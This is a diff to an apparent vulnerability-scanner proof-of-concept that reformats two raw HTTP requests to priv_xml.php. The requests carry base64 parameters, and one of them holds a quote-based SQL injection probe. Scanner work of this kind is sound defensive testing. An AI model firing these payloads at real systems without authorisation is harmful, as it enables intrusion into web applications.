@@ -33,32 +33,32 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             true_raw = '''
-            POST /inc/priv_user_list/priv_xml.php HTTP/1.1
-            Host: www.baidu.com
-            Cache-Control: max-age=0
-            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-            User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36
-            Accept-Encoding: gzip, deflate, sdch
-            Accept-Language: zh-CN,zh;q=0.8
-            Cookie: PHPSESSID=8ac23578dd33b21df60e37acfb55abzz
-            Content-Length: 44
-            Content-Type: application/x-www-form-urlencoded
+POST /inc/priv_user_list/priv_xml.php HTTP/1.1
+Host: www.baidu.com
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: PHPSESSID=8ac23578dd33b21df60e37acfb55abzz
+Content-Length: 44
+Content-Type: application/x-www-form-urlencoded
 
-            par=W3ZpZXdfdHlwZV06WzBdfFt1c2VycHJpdl06WzFd'''
+par=W3ZpZXdfdHlwZV06WzBdfFt1c2VycHJpdl06WzFd'''
 
             false_raw = '''
-            POST /inc/priv_user_list/priv_xml.php HTTP/1.1
-            Host: www.baidu.com
-            Cache-Control: max-age=0
-            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-            User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36
-            Accept-Encoding: gzip, deflate, sdch
-            Accept-Language: zh-CN,zh;q=0.8
-            Cookie: PHPSESSID=8ac23578dd33b21df60e37acfb55abee
-            Content-Length: 52
-            Content-Type: application/x-www-form-urlencoded
+POST /inc/priv_user_list/priv_xml.php HTTP/1.1
+Host: www.baidu.com
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: PHPSESSID=8ac23578dd33b21df60e37acfb55abee
+Content-Length: 52
+Content-Type: application/x-www-form-urlencoded
 
-            par=W3ZpZXdfdHlwZV06WzBdfFt1c2VycHJpdl06WzEnXQ%3d%3d'''
+par=W3ZpZXdfdHlwZV06WzBdfFt1c2VycHJpdl06WzEnXQ%3d%3d'''
 
             url = '{target}'.format(target=self.target)+'/inc/priv_user_list/priv_xml.php'
             code, head,res, errcode, _ = hh.http(url,raw=true_raw)
